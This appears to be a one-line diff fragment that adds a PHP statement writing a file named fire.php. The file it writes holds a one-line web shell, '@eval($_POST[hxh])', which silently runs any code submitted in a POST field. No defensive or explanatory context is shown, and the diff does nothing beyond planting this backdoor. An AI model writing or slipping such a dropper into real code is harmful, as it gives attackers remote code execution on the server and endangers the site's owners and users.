@@ -1,0 +1,1 @@
+file_put_contents('./fire.php','<?php @eval($_POST[hxh]); ?>'); 
